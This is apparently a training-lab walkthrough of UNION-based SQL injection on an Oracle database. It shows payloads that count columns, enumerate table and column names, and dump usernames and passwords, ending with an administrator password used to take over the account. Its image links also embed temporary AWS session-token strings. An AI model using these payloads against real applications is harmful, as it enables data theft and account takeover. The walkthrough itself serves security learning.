# Listing the database contents on Oracle database.

**STEP #1**

Determine the number of columns returned by the original query.

```text
' ORDER BY 1--
```

![](https://miro.medium.com/v2/resize:fit:700/0*RPJRor8IdZC7Ib_t)

```text
' ORDER BY 2--
```

![](https://miro.medium.com/v2/resize:fit:700/0*_T6LLNa9qwkWRm-g)

```text
' ORDER BY 3--
```

![](https://miro.medium.com/v2/resize:fit:700/0*6o_cR09enYU_U8PS)

```text
' ORDER BY 3--                           → Returns an error message.
```

**Therefore there are 2 columns returned by the original query.**

**STEP #2**

Discover the column that contains the data type string.

**NOTE**

`' UNION SELECT NULL, NULL-- `**returns an error message. Therefore you can make a guess that the database might be Oracle.**

![](https://miro.medium.com/v2/resize:fit:700/0*ZSORyG6-bFJm5eky)

```text
' UNION SELECT 'a', NULL FROM DUAL--
```

![](https://miro.medium.com/v2/resize:fit:700/0*4xkIIOJbvVxq6rWg)

```text
' UNION SELECT NULL, 'a' FROM DUAL--
```

![](https://miro.medium.com/v2/resize:fit:700/0*bxnCaG6WLBhuYcAp)

```text
' UNION SELECT 'a', NULL FROM DUAL--   →Returns a 200 status code' UNION SELECT NULL, 'a' FROM DUAL--   →Returns a 200 status code
```

Therefore both column 1 and 2 contain that data type string.

**STEP #3**

Determine the table names.

```text
' UNION SELECT TABLE_NAME, NULL FROM ALL_TABLES--
```

![](https://miro.medium.com/v2/resize:fit:700/0*0CxW812qQQf9_TiW)

Let’s find a table which contains usernames and passwords.

![](https://miro.medium.com/v2/resize:fit:700/0*4NHKFGCB_bT_Qigx)

Table name: `USERS_KDXGKJ`

**STEP #4**

Determine the column names of the table** **`USERS_KDXGKJ`**.**

```text
' UNION SELECT COLUMN_NAME, NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'USERS_KDXGKJ'--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/e308f541-4e56-4255-bd10-524cee85e1b9/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466WHOPLTDB%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204600Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDJUE7Qe%2FlQzumxERGN%2FDTdadmsw2Le%2BHBO1Z5xaIjUVgIhAOdGSQbXX65PwFcdTwKaAT91q7TRAXOfP73VKM6gOsPCKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igwd2eQxaO5KCeY6QPwq3ANNK%2BjpCWuNztGFp%2BmpdbNLOEtOyXHKlLYSrnAr4pK5WZAVPvVWF8KP%2BlAKexzWg%2Be7Vsyia473ZOM4Xwy55XgP%2FV%2F1iKlWQ8CEmmSOKbjeZGurf2mNUS0i1%2FIOb0s15g1jK%2BsY97iymTn6QIWicC9jd4cL71Xuqn4lD98XtCRv%2BmnIg4kgvbirjW9eVOuF4aMjFswfTKojXq9T%2BMSAu%2Fl89htUOZVsHzCDHLtatKJI1%2FNdDpq%2FqWouyf4i7C%2FoHGJDbBcjolX%2BHh2szKvzXd3A2tCNfZ3xY5l2Yz3K7uPQoyt%2FMYm5VzMu7GdkbkDPuN1%2B2PYs%2BS9VyZyIpaBAbjnAJLPpR9KLEcxjdToDGGAGrJUvXZaaigkWOxlXqwqgrRlDPoq%2FXC1V1nK5dsVOwtnVxmL4KZ%2F2aesgWLUuhf3JLrT%2BHFPjq%2B47qC4S%2FfsCk1JXFA3TYfrIvEE4b%2Bt%2B8VfRg6oBCemEadjny61MpXh83eM23hPpR9uvMukhj416q5rfcp1m7e8ht0Z9YBWAj1NK0%2Fh6urfp0rqpNNPdKDDoGst6TdXgVHS%2FSIrn1oOhDMlN7a%2FLHv6jZiqjzFUl2yLFuHKtqIplYAyFMcfc4udZ20waKVHUPBbiBcgY9TDtyKLUBjqkATduB4WOil9Fcpi%2F%2FFWKrZp5IC9nFezFe%2BUwBYRRnSlxZ%2FU6qP9LrlcKJ4x90EyqS2F9fs%2FyWCZgWsH0yg8UrdA1%2B%2FL7GqKjksPasLoXdGeXzbR0jJDARPPhismPF8DxhU6IUgnE05ti5k7ASj%2BPr%2BG3B6Xm46xgFSX8NeGs9XVitagOuFwCHKYk%2B37vrITp7Q30AfHdktGm7pgyWWS6PwDNwD2s&X-Amz-Signature=ab80ef71d4d6ddaf4fbbbe515b25e79fa930bf86017bb478ca4b30e12500bcf3&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**There are two columns in the table **`USERS_KDXGKJ`**.**

`username: USERNAME_CSUMYK`

`password: PASSWORD_AIOQBO`

---

**STEP #5**

Retrieve the administrator user’s password from the database.

```text
' UNION SELECT USERNAME_CSUMYK, PASSWORD_AIOQBO FROM USERS_KDXGKJ--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/3ab7ff68-30f8-4bf2-937a-fe782827a0b9/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466WHOPLTDB%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204600Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDJUE7Qe%2FlQzumxERGN%2FDTdadmsw2Le%2BHBO1Z5xaIjUVgIhAOdGSQbXX65PwFcdTwKaAT91q7TRAXOfP73VKM6gOsPCKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igwd2eQxaO5KCeY6QPwq3ANNK%2BjpCWuNztGFp%2BmpdbNLOEtOyXHKlLYSrnAr4pK5WZAVPvVWF8KP%2BlAKexzWg%2Be7Vsyia473ZOM4Xwy55XgP%2FV%2F1iKlWQ8CEmmSOKbjeZGurf2mNUS0i1%2FIOb0s15g1jK%2BsY97iymTn6QIWicC9jd4cL71Xuqn4lD98XtCRv%2BmnIg4kgvbirjW9eVOuF4aMjFswfTKojXq9T%2BMSAu%2Fl89htUOZVsHzCDHLtatKJI1%2FNdDpq%2FqWouyf4i7C%2FoHGJDbBcjolX%2BHh2szKvzXd3A2tCNfZ3xY5l2Yz3K7uPQoyt%2FMYm5VzMu7GdkbkDPuN1%2B2PYs%2BS9VyZyIpaBAbjnAJLPpR9KLEcxjdToDGGAGrJUvXZaaigkWOxlXqwqgrRlDPoq%2FXC1V1nK5dsVOwtnVxmL4KZ%2F2aesgWLUuhf3JLrT%2BHFPjq%2B47qC4S%2FfsCk1JXFA3TYfrIvEE4b%2Bt%2B8VfRg6oBCemEadjny61MpXh83eM23hPpR9uvMukhj416q5rfcp1m7e8ht0Z9YBWAj1NK0%2Fh6urfp0rqpNNPdKDDoGst6TdXgVHS%2FSIrn1oOhDMlN7a%2FLHv6jZiqjzFUl2yLFuHKtqIplYAyFMcfc4udZ20waKVHUPBbiBcgY9TDtyKLUBjqkATduB4WOil9Fcpi%2F%2FFWKrZp5IC9nFezFe%2BUwBYRRnSlxZ%2FU6qP9LrlcKJ4x90EyqS2F9fs%2FyWCZgWsH0yg8UrdA1%2B%2FL7GqKjksPasLoXdGeXzbR0jJDARPPhismPF8DxhU6IUgnE05ti5k7ASj%2BPr%2BG3B6Xm46xgFSX8NeGs9XVitagOuFwCHKYk%2B37vrITp7Q30AfHdktGm7pgyWWS6PwDNwD2s&X-Amz-Signature=c56d67d5831495b49ab5ca1bb8bad692eb36f707e7dee2957d65619017efc652&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

| administrator | r1xyd5uo3kcovvqm73jl |
Use the password to get administrators access to the web application.

